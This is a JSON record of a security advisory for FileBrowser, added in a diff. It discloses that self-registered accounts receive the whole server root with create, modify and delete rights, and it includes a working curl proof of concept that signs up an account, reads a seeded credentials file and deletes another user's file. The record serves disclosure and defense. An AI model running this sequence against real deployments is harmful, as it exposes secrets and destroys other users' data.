@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-6759-996p-gpj6",
+  "repo": {
+    "cve_id": "CVE-2026-72839",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-1188",
+      "CWE-266"
+    ],
+    "description": "## Summary\r\n\r\nWhen self-registration is enabled (`Signup=true`) and the factory-default `CreateUserDir=false` is left unchanged, the `signupHandler` endpoint (`POST /api/signup`) creates every new account with `Scope=\"/\"`, the entire FileBrowser server root, together with the default Create/Modify/Delete/Rename/Share/Download permissions.\r\n\r\nAny unauthenticated user can register an account and immediately read, modify, and delete every file FileBrowser manages, including other users' private files and any host paths mounted into the served directory. The previous signup hardening (CVE-2026-32760 / CVE-2026-34528 / CVE-2026-35607) only stripped the inherited `Admin`, `Execute`, and `Commands` privileges; it never reset `Scope` or the remaining destructive permissions, so the escalation primitive is still fully present in v2.63.15.\r\n\r\n## Details\r\n\r\n**1. The handler applies all defaults, then clears only Admin/Execute/Commands (`http/auth.go:176`)**\r\n\r\n```go\r\nd.settings.Defaults.Apply(user)   // copies default Scope (\".\") and the full Perm set\r\n\r\nuser.Perm.Admin = false           // line 180, cleared\r\nuser.Perm.Execute = false         // line 185, cleared\r\nuser.Commands = []string{}        // line 186, cleared\r\n// Create, Modify, Delete, Rename, Share, Download are NOT cleared\r\n```\r\n\r\n`Defaults.Apply` copies the entire `Permissions` struct and the default `Scope`. Only three privileges are stripped afterwards; the six CRUD permissions survive.\r\n\r\n**2. Scope is only reset when `CreateUserDir` is enabled (`http/auth.go:194-203`)**\r\n\r\n```go\r\nif d.settings.CreateUserDir {\r\n    user.Scope = \"\"               // only reached when CreateUserDir=true\r\n}\r\nuserHome, err := d.settings.MakeUserDir(user.Username, user.Scope, d.server.Root)\r\n// ...\r\nuser.Scope = userHome\r\n```\r\n\r\n`CreateUserDir` is `false` by factory default, so this branch is skipped and `user.Scope` keeps the default value `\".\"` set by `Apply`.\r\n\r\n**3. `MakeUserDir` normalizes `\".\"` to `\"/\"` (`settings/dir.go:33`)**\r\n\r\n```go\r\nuserScope = path.Join(\"/\", userScope)   // path.Join(\"/\", \".\") == \"/\"\r\n```\r\n\r\nThe normalized scope `\"/\"` is written back as `user.Scope`, so the account is persisted with access to the whole server root.\r\n\r\n**4. Net effect**\r\n\r\nWith only `Signup` flipped on and everything else at factory defaults, an unauthenticated registrant receives the server root (`/`) plus six CRUD permissions. `Signup` is the single deliberate change an administrator makes when they choose to offer self-registration; no other non-default configuration is required.\r\n\r\n## PoC\r\n\r\nTested against `filebrowser/filebrowser:v2.63.15` with sample files `/srv/sensitive/db_creds.txt`, `/srv/user1/private/creds.txt`, and `/srv/user2/finance.csv`.\r\n\r\n**Attack Vector: read and delete the server root as an unauthenticated registrant:**\r\n\r\n```bash\r\n#1. Seed sample data in /tmp and start a fresh v2.63.15 container\r\nmkdir -p /tmp/filebrowser-test/srv/{user1/private,user2,sensitive}\r\necho \"ROOT_DB_PASSWORD=supersecret\" > /tmp/filebrowser-test/srv/sensitive/db_creds.txt\r\necho \"SECRET_PASSWORD=hunter2\"      > /tmp/filebrowser-test/srv/user1/private/creds.txt\r\necho \"financial data\"              > /tmp/filebrowser-test/srv/user2/finance.csv\r\ndocker run -d --name filebrowser-test -p 8090:80 -v /tmp/filebrowser-test/srv:/srv filebrowser/filebrowser:v2.63.15 && sleep 4\r\nB=http://localhost:8090\r\n\r\n#2. Admin logs in and enables self-registration (signup=true), the ONLY non-default change; all else factory default\r\nAP=$(docker logs filebrowser-test 2>&1 | grep -o 'password: .*' | awk '{print $2}')\r\nAT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"$AP\\\"}\")\r\ncurl -s -H \"X-Auth: $AT\" $B/api/settings \\\r\n  | python3 -c \"import sys,json;d=json.load(sys.stdin);d['signup']=True;print(json.dumps(d))\" \\\r\n  | curl -s -X PUT $B/api/settings -H \"X-Auth: $AT\" -H 'Content-Type: application/json' -d @-\r\n\r\n#3. Attacker self-registers with no authentication\r\ncurl -s -X POST $B/api/signup -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"password\":\"AttackerPass123!\"}'\r\n\r\n#4. Attacker logs in and captures the JWT\r\nXT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"password\":\"AttackerPass123!\"}')\r\n\r\n#5. Attacker lists the entire server root (sees sensitive, user1, user2)\r\ncurl -s \"$B/api/resources/\"                  -H \"X-Auth: $XT\"\r\n\r\n#6. Attacker reads another scope's secret\r\ncurl -s \"$B/api/raw/sensitive/db_creds.txt\"  -H \"X-Auth: $XT\"\r\n\r\n#7. Attacker deletes another user's file (prints HTTP 204)\r\ncurl -s -X DELETE \"$B/api/resources/user2/finance.csv\" -H \"X-Auth: $XT\" -o /dev/null -w '%{http_code}\\n'\r\n```\r\n\r\nExpected output (reproduced on a fresh `filebrowser-test` container, v2.63.15):\r\n\r\n```http\r\nGET /api/resources/                       -> 200\r\n{\"path\":\"/\",\"items\":[{\"name\":\"sensitive\",...},{\"name\":\"user1\",...},{\"name\":\"user2\",...}]}\r\n\r\nGET /api/raw/sensitive/db_creds.txt       -> 200\r\nROOT_DB_PASSWORD=supersecret\r\n\r\nDELETE /api/resources/user2/finance.csv   -> 204   (empty body, file deleted)\r\n\r\nGET /api/users   (as admin, confirms how the registrant was stored)  -> 200\r\n{\"username\":\"attacker\",\"scope\":\"/\",\"perm\":{\"create\":true,\"rename\":true,\"modify\":true,\"delete\":true,\"share\":true,\"download\":true}}\r\n```\r\n\r\n## Impact\r\n\r\n- **Unauthenticated full read:** any registrant can download or share every file, including other users' private data, configuration, secrets, and any host paths mounted into the served volume.\r\n- **Unauthenticated full write:** the registrant can create, overwrite, or rename any file, defacement, planting malicious content (e.g. a web shell where the served tree overlaps a web root), or silent data tampering.\r\n- **Unauthenticated deletion:** the registrant can delete any file, causing data loss or denial of service for all users.\r\n- **Multi-tenant breakout:** in any shared deployment, a single self-registered account reads and destroys every other user's files.\r\n- **No special permissions required:** the attack needs only that an admin enabled `Signup`; the registrant inherits the dangerous scope and permissions automatically.\r\n\r\n## Resolution\r\n\r\nAs this is mostly a configuration footgun, a startup warning has been added when signup is enabled without `createUserDir` and the default scope resolves to root. In addition, the documentation has been updated to include the best practices regarding signup: https://filebrowser.org/deployment.html#self-registration-signup.\r\n",
+    "ghsa_id": "GHSA-6759-996p-gpj6",
+    "html_url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-6759-996p-gpj6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6759-996p-gpj6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72839"
+      }
+    ],
+    "published_at": "2026-07-25T05:22:20Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Self-signup users inherit the server root as their scope",
+    "updated_at": "2026-08-21T06:39:01Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 2.63.16"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "filebrowser/filebrowser"
+}
